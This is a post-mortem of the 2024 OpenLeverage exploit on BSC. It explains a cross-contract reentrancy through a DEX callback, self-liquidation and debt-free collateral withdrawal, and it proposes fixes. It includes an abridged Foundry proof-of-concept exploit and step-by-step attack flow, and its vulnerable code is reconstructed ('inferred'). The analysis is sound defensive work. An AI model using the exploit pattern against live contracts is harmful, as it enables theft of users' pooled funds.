# OpenLeverage — Debt Tracking Bypass Attack via Cross-Contract Reentrancy Analysis

| Item | Details |
|------|------|
| **Date** | 2024-04-01 |
| **Protocol** | OpenLeverage (BSC Margin Trading and Lending Protocol) |
| **Chain** | BSC (BNB Chain) |
| **Loss** | ~$234,000 (BSC: ~$194,000 + Arbitrum: ~$40,000) |
| **Attacker** | [0x5bb5...3d5f](https://bscscan.com/address/0x5bb5b6d41c3e5e41d9b9ed33d12f1537a1293d5f) |
| **Attack Contract** | [0xd0c8...4e93](https://bscscan.com/address/0xd0c8af170397c04525a02234b65e9a39969f4e93) |
| **Attack Tx 1** | [0xf78a...d02d5](https://bscscan.com/tx/0xf78a85eb32a193e3ed2e708803b57ea8ea22a7f25792851e3de2d7945e6d02d5) |
| **Attack Tx 2** | [0x2100...6067](https://bscscan.com/tx/0x210071108f3e5cd24f49ef4b8bcdc11804984b0c0334e18a9a2cdb4cd5186067) |
| **Vulnerable Contract** | [0xf436...5E47](https://bscscan.com/address/0xf436f8fe7b26d87eb74e5446acec2e8ad4075e47) (OPBorrowingDelegator) |
| **Root Cause** | Reentrancy during DEX swap callback within `marginTrade()` — `OPBorrowingDelegator.borrow()` is re-entered from the `Executor.execute()` callback, creating an inconsistent state where a margin position and a separate borrow position coexist, then `liquidate()` + `payoffTrade()` are used to seize the full collateral without repaying debt |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/OpenLeverage2_exp.sol) |

---

## 1. Vulnerability Overview

OpenLeverage is a margin trading and decentralized lending protocol operating on BSC. Users can open margin positions via `TradeController.marginTrade()` and access separate collateralized loans via `OPBorrowingDelegator.borrow()`.

The core vulnerability is that **no reentrancy guard is applied at the point where an external DEX aggregator callback occurs during `marginTrade()` execution**. The attacker re-invoked `OPBorrowingDelegator.borrow()` during this callback window, simultaneously creating both a margin position and an independent borrow position for the same marketId.

The attack flow is then split across two transactions:

1. **TX 1**: Reentrancy during `marginTrade()` creates dual positions → `OPBorrowingDelegator.liquidate()` self-liquidates the borrow position to recover collateral while abusing the `repayBorrowEndByOpenLev` logic to perform only a minimal repayment
2. **TX 2**: After a few blocks, `TradeController.payoffTrade()` is called to withdraw the remaining collateral from the margin position without actually repaying the debt

Due to the inconsistency in the dual position records, the protocol treats the position as fully liquidated and closed despite having outstanding debt, and returns the collateral assets. As a result, the attacker stole approximately $234,000 worth of assets.

---

## 2. Vulnerable Code Analysis

### 2.1 marginTrade() — Reentrancy Vulnerability During DEX Callback (Core)

```solidity
// ❌ Vulnerable code — OpenLevV1.marginTrade() (inferred)
function marginTrade(
    uint16 marketId,
    bool longToken,
    bool depositToken,
    uint256 deposit,
    uint256 borrow,
    uint256 minBuyAmount,
    bytes memory dexData
) external payable returns (uint256) {
    // Issue: no nonReentrant modifier
    // Issue: control transferred to external contract (Executor) during DEX swap
    // Issue: position state is not yet fully recorded at the time of Executor.execute() callback

    // 1. Transfer collateral in
    _transferIn(depositToken ? token0 : token1, msg.sender, deposit);

    // 2. Calculate borrow amount and borrow from LToken
    uint256 borrowed = _borrow(marketId, longToken, borrow);

    // 3. Execute DEX swap — external aggregator callback occurs here
    //    Even if OPBorrowingDelegator.borrow() is re-entered inside Executor.execute(),
    //    there is no mechanism to prevent it (❌ missing reentrancy guard)
    uint256 bought = _swapViaDex(borrow + deposit, dexData);

    // 4. Record position (state inconsistency possible since this runs after reentrancy)
    activeTrades[msg.sender][marketId][longToken] = Trade(deposit, bought, depositToken, uint128(block.number));

    return bought;
}
```

```solidity
// ✅ Fixed code — apply nonReentrant and follow CEI pattern
// Requires inheriting OpenZeppelin ReentrancyGuard
function marginTrade(
    uint16 marketId,
    bool longToken,
    bool depositToken,
    uint256 deposit,
    uint256 borrow,
    uint256 minBuyAmount,
    bytes memory dexData
) external payable nonReentrant returns (uint256) {
    // ✅ nonReentrant blocks reentrancy
    // ✅ Record position before external calls (CEI pattern)

    _transferIn(depositToken ? token0 : token1, msg.sender, deposit);

    uint256 borrowed = _borrow(marketId, longToken, borrow);

    // ✅ Record state first (before external calls)
    activeTrades[msg.sender][marketId][longToken] = Trade(deposit, 0, depositToken, uint128(block.number));

    // Then execute external DEX swap
    uint256 bought = _swapViaDex(borrow + deposit, dexData);

    // ✅ Update only the final amount
    activeTrades[msg.sender][marketId][longToken].held = bought;

    return bought;
}
```

**Issue**: The `marginTrade()` function is missing the `nonReentrant` modifier during the swap step where control is handed to an external DEX aggregator (`Executor` contract). The attacker's deployed `Executor.execute()` callback can freely re-invoke `OPBorrowingDelegator.borrow()`, causing both a margin position and a separate borrow position to be simultaneously recorded in the protocol's state for the same user.

---

### 2.2 OPBorrowingDelegator.liquidate() — Excess Collateral Return on Borrow Position Liquidation

```solidity
// ❌ Vulnerable code — OPBorrowingDelegator.liquidate() (inferred)
function liquidate(uint16 marketId, bool collateralIndex, address borrower) external {
    BorrowVars memory vars = borrowVars[borrower][marketId][collateralIndex];

    // Issue: liquidation only tracks positions created via borrow()
    // Does not include collateral from the separate margin position created via marginTrade()
    // However, the boundary between the two positions is unclear during collateral return after liquidation

    uint256 collateral = vars.collateral;
    uint256 debt = vars.borrowing;

    // Pay liquidation bonus (provide some collateral to liquidator)
    // Call repayBorrowEndByOpenLev → processes only minimum repayment amount
    _repayAndClosePosition(borrower, marketId, collateralIndex, collateral, debt);
    // ❌ No cross-validation with margin position debt
}
```

```solidity
// ✅ Fixed code
function liquidate(uint16 marketId, bool collateralIndex, address borrower) external {
    // ✅ Cross-validate between marginTrade position and borrow position
    Trade memory marginPos = tradeController.activeTrades(borrower, marketId, true);
    BorrowVars memory borrowPos = borrowVars[borrower][marketId][collateralIndex];

    // ✅ Block liquidation if both positions coexist for the same user/market
    require(
        marginPos.held == 0 || borrowPos.borrowing == 0,
        "Concurrent margin+borrow positions exist: liquidation blocked"
    );

    // Proceed with normal liquidation logic
    _repayAndClosePosition(borrower, marketId, collateralIndex, borrowPos.collateral, borrowPos.borrowing);
}
```

**Issue**: The `liquidate()` function handles only the `borrow()` position independently and does not validate its interaction with the `marginTrade()` position. After the attacker creates both positions simultaneously via reentrancy, calling `liquidate()` allows them to liquidate the borrow position at minimal cost while effectively double-accessing the margin position's collateral.

---

### 2.3 TradeController.payoffTrade() — Collateral Withdrawal Without Debt Verification

```solidity
// ❌ Vulnerable code — TradeController.payoffTrade() (inferred)
function payoffTrade(uint16 marketId, bool longToken) external payable {
    Trade memory trade = activeTrades[msg.sender][marketId][longToken];
    require(trade.held > 0, "No position exists");

    // Issue: does not check the outstanding borrow position state in OPBorrowingDelegator
    // Even if the borrow position is recorded as liquidated via a prior liquidate() call,
    // there is no cross-check logic to verify the entire debt was actually repaid

    uint256 depositAmount = trade.depositToken ? trade.deposited : _swapForDeposit(trade.held);

    // ❌ Returns collateral without checking for outstanding debt
    _transferOut(trade.depositToken ? token0 : token1, msg.sender, depositAmount);
    delete activeTrades[msg.sender][marketId][longToken];
}
```

```solidity
// ✅ Fixed code
function payoffTrade(uint16 marketId, bool longToken) external payable nonReentrant {
    Trade memory trade = activeTrades[msg.sender][marketId][longToken];
    require(trade.held > 0, "No position exists");

    // ✅ Check for outstanding borrow positions in OPBorrowingDelegator
    (uint256 borrowingAmount,) = opBorrowing.getBorrowBalance(msg.sender, marketId, true);
    require(borrowingAmount == 0, "Outstanding borrow position exists: payoff blocked");

    uint256 depositAmount = trade.depositToken ? trade.deposited : _swapForDeposit(trade.held);
    _transferOut(trade.depositToken ? token0 : token1, msg.sender, depositAmount);
    delete activeTrades[msg.sender][marketId][longToken];
}
```

**Issue**: `payoffTrade()` does not check the borrow position balance in `OPBorrowingDelegator`. The attacker can falsely mark the borrow position as liquidated in TX 1, then call `payoffTrade()` in TX 2 (after a few blocks) to withdraw the full margin position collateral without actually repaying the debt.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker prepares 5 BNB, an attack contract (`ContractTest`), and a custom DEX Executor (`Executor`)
- Acquires small amounts of USDC/OLE via WBNB, creates a USDC-OLE LP, and locks it in xOLE
  - Purpose: satisfy OpenLeverage protocol's reward or governance participation requirements and meet the margin trading eligibility condition
- Swaps remaining BNB to BUSDT for use as marginTrade collateral

### 3.2 Execution Phase (TX 1 — Block 37,470,328)

1. **Call `TradeController.marginTrade()`**: marketId=24, BUSDT collateral, WBNB borrow
   - Internally executes an external DEX aggregator swap → **`Executor.execute()` callback triggered**

2. **[Reentrancy] Inside `Executor.execute()`**:
   - Swaps WBNB → BUSDT and delivers to `TradeController`
   - Executes `owner.call(borrow())` → **calls the attack contract's `borrow()` function**
   - Re-enters `OPBorrowingDelegator.borrow(marketId=24, collateralIndex=true, collateral=1_000_000, borrowing=0)`
   - At this point `marginTrade()` is still executing → both positions are simultaneously recorded in the protocol state

3. **`marginTrade()` completes**: Margin position is finally recorded in `activeTrades`

4. **Call `OPBorrowingDelegator.liquidate(marketId=24, collateralIndex=true, borrower=attacker)`**:
   - Self-liquidates the attacker's own borrow position
   - Logic flaw in `repayBorrowEndByOpenLev` results in only minimal repayment
   - Borrow position record deleted, partial collateral returned

### 3.3 Execution Phase (TX 2 — Block 37,470,331)

5. **Call `TradeController.payoffTrade(marketId=24, longToken=true)`**:
   - Borrow position already recorded as liquidated
   - Full collateral returned without verifying outstanding debt on the margin position
   - WBNB withdrawn and swapped to BUSDT

6. **Profit realized**: ~$194,000 worth of BUSDT stolen compared to initial 5 BNB investment (BSC only)

### 3.4 Attack Flow Diagram

```
[TX 1 — Block 37,470,328]

┌─────────────────────────────────────────────────────────────────────┐
│  Attacker Contract (ContractTest)                                    │
│  Holds 5 WBNB / BUSDT prepared                                       │
└────────────────────────┬────────────────────────────────────────────┘
                         │ marginTrade(marketId=24, deposit=BUSDT, borrow=WBNB)
                         ▼
┌─────────────────────────────────────────────────────────────────────┐
│  TradeController.marginTrade()                                       │
│  ① Receive collateral (BUSDT)                                        │
│  ② Borrow WBNB from LToken                                           │
│  ③ Call external DEX aggregator swap ──▶ Executor.execute() callback │
└──────────────────────────────────────┬──────────────────────────────┘
                                       │ Callback (reentrant state)
                                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Executor.execute() [deployed by attacker]                           │
│  ① Swap WBNB → BUSDT and deliver to TradeController                  │
│  ② Execute owner.call("borrow()") ──▶ re-invoke attacker's borrow()  │
└──────────────────────────────────────┬──────────────────────────────┘
                                       │ Reentrancy
                                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  OPBorrowingDelegator.borrow(marketId=24)  [Reentrancy]              │
│  ⚠ Borrow position created while marginTrade() is not yet complete   │
│  → Margin position + borrow position coexist for same user/market    │
│    (state inconsistency)                                             │
└─────────────────────────────────────────────────────────────────────┘
                                       │ marginTrade() resumes after reentrancy completes
                                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  TradeController.marginTrade() completes                             │
│  activeTrades[attacker][24][true] recorded                           │
└──────────────────────────────────────┬──────────────────────────────┘
                                       │
                                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  OPBorrowingDelegator.liquidate(marketId=24, borrower=attacker)      │
│  ① Self-liquidate attacker's own borrow position                     │
│  ② Logic flaw in repayBorrowEndByOpenLev → only minimal repayment    │
│  ③ Borrow position deleted, partial collateral returned              │
└─────────────────────────────────────────────────────────────────────┘

[TX 2 — Block 37,470,331 (3 blocks later)]

┌─────────────────────────────────────────────────────────────────────┐
│  TradeController.payoffTrade(marketId=24, longToken=true)            │
│  ① Confirm margin position remains in activeTrades                   │
│  ② No cross-check for outstanding OPBorrowingDelegator debt (❌)     │
│  ③ Full collateral (WBNB) returned                                   │
└──────────────────────────────────────┬──────────────────────────────┘
                                       │
                                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Attacker realizes profit                                            │
│  WBNB withdrawn → swapped to BUSDT                                   │
│  Total profit: ~$194,000 (BSC) + ~$40,000 (Arbitrum) = ~$234,000    │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.5 Outcome

- **Attacker profit**: ~$234,000 (BSC $194,000 + Arbitrum $40,000)
- **Protocol loss**: ~$234,000 (LToken liquidity drained)
- **Protocol response**: Smart contracts paused, decision made to shut down service, promised to compensate victims using insurance and buyback funds

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/OpenLeverage2_exp.sol
// Total loss: ~234K USD | Attack date: 2024-04-01 | Chain: BSC

// ── [Preparation] setUp() ───────────────────────────────────────────
// Fork at BSC block 37,470,328
// Targets:
//   TradeController: 0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4
//   OPBorrowingDelegator: 0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47
//   LToken(WBNB): 0x7c5e04894410e98b1788fbdB181FfACbf8e60617
//   marketId: 24 (WBNB/BUSDT market)

function testExploit() public {
    // ── [Step 1: TX 1 begins] ────────────────────────────────────────
    deal(address(this), 5 ether);  // Attack seed funds: 5 BNB

    // Acquire small amounts of USDC/OLE, create USDC-OLE LP → lock in xOLE
    // Purpose: satisfy OpenLeverage marginTrade eligibility requirement (xOLE holding)
    WBNBToOLE();
    OLE.transfer(address(USDC_OLE), OLE.balanceOf(address(this)));
    USDC.transfer(address(USDC_OLE), USDC.balanceOf(address(this)));
    USDC_OLE.mint(address(this));
    USDC_OLE.approve(address(xOLE), USDC_OLE.balanceOf(address(this)));
    xOLE.create_lock(1, 1_814_400 + block.timestamp);

    // ── [Step 2: Calculate margin trade parameters] ──────────────────
    (,,,, uint16 marginLimit, ...) = TradeController.markets(marketId);
    uint256 underlyingWBNBBal = LToken.getCash();

    // Proceed with attack only if LToken has liquidity
    if (underlyingWBNBBal > 1e14) {
        // Process interest accrual
        LToken.accrueInterest();
        uint256 availableBorrow = LToken.availableForBorrow();

        // Calculate maximum borrowable amount (based on marginLimit)
        uint256 amountToBorrow = (amountsOut[2] * 3000) / marginLimit;

        // Swap BNB → BUSDT (for use as collateral)
        uint256[] memory amounts = WBNBToBUSDT();
        BUSDT.approve(address(TradeController), amounts[1]);

        // ── [Step 3: Core attack — deploy Executor and set up reentrancy] ──
        // Attacker deploys custom Executor contract
        // Executor.execute() callback performs OPBorrowingDelegator.borrow() reentrancy
        Executor executor = new Executor();

        // Construct DEX aggregator parameters
        // First byte of dexData (0x15) specifies the external aggregator ID
        // → Causes TradeController to invoke Executor.execute() as callback
        bytes memory dexData = abi.encodePacked(bytes5(hex"1500000002"), swapData);

        // ── [Step 4: Call marginTrade → reentrancy occurs during callback] ──
        // Executor.execute() is called inside marginTrade
        // Executor re-enters borrow() → dual positions created
        TradeController.marginTrade(marketId, true, true, amountsOut[1], amountToBorrow, 0, dexData);

        // ── [Step 5: Self-liquidate to close borrow position] ────────
        // liquidate() only handles borrow position → margin position maintained separately
        // Validation flaw in repayBorrowEndByOpenLev results in only minimal repayment
        OPBorrowingDelegator.liquidate(marketId, true, address(this));
    }

    // ── [Step 6: TX 2 — withdraw collateral after 3 blocks] ──────────
    vm.rollFork(37_470_331);  // Re-execute 3 blocks later

    // payoffTrade: does not check borrow position balance → returns full collateral
    // Successfully recovers WBNB collateral without actually repaying debt
    TradeController.payoffTrade(marketId, true);

    // Convert WBNB → BNB → BUSDT and finalize profit
    WBNB.withdraw(WBNB.balanceOf(address(this)));
    BUSDTToWBNB();
}

// ── [Reentrancy trigger] Executor.execute() ─────────────────────────
// This function is called as a callback during marginTrade's DEX swap
function execute(address _sender) external {
    // Swap WBNB → BUSDT and deliver to TradeController (mimics normal swap)
    WBNB.approve(address(Router), type(uint256).max);
    Router.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 1, path, msg.sender, block.timestamp);

    // ❗ Core reentrancy: call owner(attacker).borrow() here
    // → OPBorrowingDelegator.borrow() is re-invoked during marginTrade()
    (bool success,) = owner.call(abi.encodeWithSignature("borrow()"));
    require(success, "Call to borrow not successful");
}

// ── [Reentrancy function] borrow() ──────────────────────────────────
// Called indirectly from Executor.execute() callback
function borrow() external {
    BUSDT.approve(address(OPBorrowingDelegator), type(uint256).max);
    // Creates an additional borrow position while marginTrade() is in progress
    // Both types of positions now coexist for the same marketId(24)
    OPBorrowingDelegator.borrow(marketId, true, 1_000_000, 0);
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Cross-function reentrancy (`marginTrade` → `Executor` callback → `borrow`) | CRITICAL | CWE-841 |
| V-02 | Cross-contract debt state inconsistency (missing cross-validation between margin position and borrow position) | CRITICAL | CWE-362 |
| V-03 | Missing outstanding debt check in `payoffTrade()` | HIGH | CWE-284 |
| V-04 | Insufficient self-liquidation prevention in `liquidate()` | HIGH | CWE-285 |
| V-05 | Repayment amount validation flaw in `repayBorrowEndByOpenLev` | HIGH | CWE-20 |

### V-01: Cross-Function Reentrancy (`marginTrade` → DEX Callback → `borrow`)

- **Description**: `TradeController.marginTrade()` lacks the `nonReentrant` modifier during the swap step where control is transferred to an external DEX aggregator, allowing the attacker's deployed custom `Executor` contract's `execute()` callback to freely re-invoke `OPBorrowingDelegator.borrow()`. This is not a single-function reentrancy but a cross-contract reentrancy that routes through different contracts.
- **Impact**: A margin position and a borrow position are simultaneously created for the same user/market, putting the protocol's accounting state into an inconsistent condition.
- **Attack Condition**: The attacker must be able to deploy a custom contract registerable as an external DEX aggregator, and must satisfy the minimum xOLE holding requirement.

### V-02: Cross-Contract Debt State Inconsistency

- **Description**: `TradeController` and `OPBorrowingDelegator` each record the same user's positions in independent storage, with no real-time cross-validation mechanism between the two contracts. When both positions coexist due to reentrancy, the protocol cannot accurately aggregate the total debt.
- **Impact**: The protocol treats the position as fully liquidated despite outstanding unpaid debt, allowing collateral to be returned.
- **Attack Condition**: Successful dual position creation via V-01 followed by self-liquidation execution.

### V-03: Missing Outstanding Debt Check in `payoffTrade()`

- **Description**: `payoffTrade()`, called when closing a margin position, does not check whether any outstanding borrow debt exists in `OPBorrowingDelegator` for the same user/market.
- **Impact**: The attacker completes the final theft step in TX 2 by withdrawing the full collateral without actual repayment.
- **Attack Condition**: Borrow position falsely recorded as liquidated via V-01 and V-02 in TX 1.

### V-04: Insufficient Self-Liquidation Prevention in `liquidate()`

- **Description**: `OPBorrowingDelegator.liquidate()` does not block cases where the liquidator and borrower are the same address. Self-liquidation creates a structure where liquidation bonuses are paid to oneself while debt is repaid at a minimum.
- **Impact**: The attacker can self-liquidate the borrow position at minimal cost to erase the record.
- **Attack Condition**: The `liquidate()` function allows an arbitrary `borrower` address to be specified externally.

### V-05: Repayment Amount Validation Flaw in `repayBorrowEndByOpenLev`

- **Description**: The `repayBorrowEndByOpenLev` function called during liquidation does not enforce full repayment of the actual borrowed amount, allowing the attacker to close the position after repaying only a minimum amount.
- **Impact**: The position is recorded as fully liquidated from the protocol's perspective even though the debt has not been fully repaid.
- **Attack Condition**: Compound exploitation during self-liquidation (V-04).

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 Apply Reentrancy Locks to All State-Changing Functions

```solidity
// ✅ Apply OpenZeppelin ReentrancyGuard or custom mutex
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract TradeController is ReentrancyGuard {
    // Apply to all external state-changing functions: marginTrade, payoffTrade, liquidate, etc.
    function marginTrade(...) external payable nonReentrant returns (uint256) { ... }
    function payoffTrade(...) external payable nonReentrant { ... }
}

contract OPBorrowingDelegator is ReentrancyGuard {
    function borrow(...) external payable nonReentrant { ... }
    function liquidate(...) external nonReentrant { ... }
}
```

#### 6.2 Add Cross-Validation of Outstanding Borrow Positions to `payoffTrade()`

```solidity
function payoffTrade(uint16 marketId, bool longToken) external payable nonReentrant {
    // ✅ Check for outstanding debt in OPBorrowingDelegator
    (uint256 debtAmount,) = opBorrowing.getBorrowBalance(msg.sender, marketId, longToken);
    require(debtAmount == 0, "Outstanding borrow balance exists: payoff blocked");

    // Normal close logic follows
    Trade memory trade = activeTrades[msg.sender][marketId][longToken];
    ...
}
```

#### 6.3 Block Self-Liquidation

```solidity
function liquidate(uint16 marketId, bool collateralIndex, address borrower) external nonReentrant {
    // ✅ Block when liquidator and borrower are the same
    require(msg.sender != borrower, "Self-liquidation not allowed");
    ...
}
```

#### 6.4 Enforce Full Repayment Validation

```solidity
function _repayBorrowEndByOpenLev(address borrower, uint256 borrowAmount) internal {
    // ✅ Verify actual repayment amount is at least the borrowed amount
    require(repaidAmount >= borrowAmount, "Partial repayment not allowed: full repayment required");
    ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Cross-contract reentrancy | Apply `nonReentrant` to all functions containing external calls; follow CEI (Checks-Effects-Interactions) pattern |
| V-02 State inconsistency | Introduce a unified Position Manager between `TradeController` and `OPBorrowingDelegator`; prevent duplicate position creation for the same user/market |
| V-03 Missing debt check | Implement a utility function that batch-checks outstanding debt across related contracts in position closing functions (payoffTrade, etc.) |
| V-04 Self-liquidation | Add `require(msg.sender != borrower)` |
| V-05 Partial repayment | Enforce 100% minimum repayment floor for liquidation repayments |
| Overall architecture | Manage margin trading and lending functionality through a single unified position registry to fundamentally prevent state inconsistencies |

---

## 7. Lessons Learned

1. **Cross-contract reentrancy is harder to detect than single-function reentrancy**: Even if `nonReentrant` is applied to specific functions, reentrancy via the path of external DEX callback → a different function in a different contract is not blocked. **All state-changing functions** across the protocol must have reentrancy locks applied, and every point where control is passed to an external contract must be classified as a potential reentrancy risk.

2. **Ensuring position state consistency is critical in multi-contract DeFi systems**: When contracts like `TradeController` and `OPBorrowingDelegator` coexist and track the same user's assets separately, attackers can exploit the gap between two systems if each contract does not cross-validate the other's state in real time.

3. **Self-liquidation must always be prohibited**: In protocols with a liquidation incentive structure (liquidation bonuses), allowing self-liquidation enables attackers to erase their own position records at minimal cost while also collecting the bonus.

4. **Two-transaction attack pattern**: The pattern of creating a vulnerable state in TX 1 and completing the actual theft in TX 2 after a few blocks is difficult to detect with single-transaction analysis. On-chain monitoring must also detect patterns of multiple consecutive transactions from the same address.

5. **Custom contract registration for external DEX aggregator integrations must be restricted**: The fact that the attacker was able to register an arbitrary `Executor` contract as a DEX aggregator opened the reentrancy path. A defense layer is needed that either restricts external call target addresses to a whitelist, or re-validates state after every external call.

6. **The importance of protocol shutdown decisions and insurance funds**: OpenLeverage quickly paused the protocol after the incident and compensated victims using insurance and buyback funds. The decision to prioritize restoring user trust over the risks of a large-scale redeployment can be referenced as a best practice for DeFi protocol crisis response.

---

## 8. On-Chain Verification

On-chain verification was performed via public transaction explorers.

### 8.1 Key Address Verification

| Item | Address | Note |
|------|------|------|
| Attacker EOA | [0x5bb5...3d5f](https://bscscan.com/address/0x5bb5b6d41c3e5e41d9b9ed33d12f1537a1293d5f) | Matches PoC `@KeyInfo` |
| Vulnerable contract | [0xf436...5E47](https://bscscan.com/address/0xf436f8fe7b26d87eb74e5446acec2e8ad4075e47) | OPBorrowingDelegator |
| Attack Tx 1 | [0xf78a...d02d5](https://bscscan.com/tx/0xf78a85eb32a193e3ed2e708803b57ea8ea22a7f25792851e3de2d7945e6d02d5) | Reentrancy + self-liquidation |
| Attack Tx 2 | [0x2100...6067](https://bscscan.com/tx/0x210071108f3e5cd24f49ef4b8bcdc11804984b0c0334e18a9a2cdb4cd5186067) | payoffTrade collateral theft |

### 8.2 PoC vs Reported Amount Comparison

| Item | PoC Value | Reported Amount | Note |
|------|--------|-----------|------|
| Total loss | ~234K USD | ~234K USD (BSC+ARB) | Match |
| Attack seed | 5 BNB | 5 BNB | Based on PoC deal() |
| Attack block | 37,470,328 | 2024-04-01 | Matches BSC block timestamp |
| TX interval | 3 blocks | — | vm.rollFork(37,470,331) |

### 8.3 Verification References

- BlockSec Explorer TX 1 analysis: https://app.blocksec.com/explorer/tx/bsc/0xf78a85eb32a193e3ed2e708803b57ea8ea22a7f25792851e3de2d7945e6d02d5
- BlockSec Explorer TX 2 analysis: https://app.blocksec.com/explorer/tx/bsc/0x210071108f3e5cd24f49ef4b8bcdc11804984b0c0334e18a9a2cdb4cd5186067